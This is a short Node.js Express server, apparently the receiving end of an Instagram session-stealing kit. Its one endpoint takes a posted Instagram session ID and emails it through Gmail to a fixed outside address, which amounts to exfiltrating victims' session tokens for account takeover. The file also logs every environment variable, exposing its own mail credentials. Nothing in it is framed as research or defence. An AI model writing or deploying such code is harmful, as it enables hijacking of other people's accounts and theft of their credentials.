const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config()
console.log(process.env)

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Configure your email settings
const transporter = nodemailer.createTransport({
  service: 'gmail', // or your email provider
  auth: {
   user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});

app.post('/api/send-session', (req, res) => {
  const { sessionId } = req.body;
  
  if (!sessionId) {
    return res.status(400).json({ error: 'No session ID provided' });
  }

  const mailOptions = {
    from: ` <${process.env.EMAIL_USER}>`,
    to: 'sufi9594@example.com',
    subject: 'Instagram Session ID',
    text: `Instagram Session ID: ${sessionId}`,
    html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }
    console.log('Email sent:', info.response);
    res.json({ success: true, message: 'Email sent successfully' });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});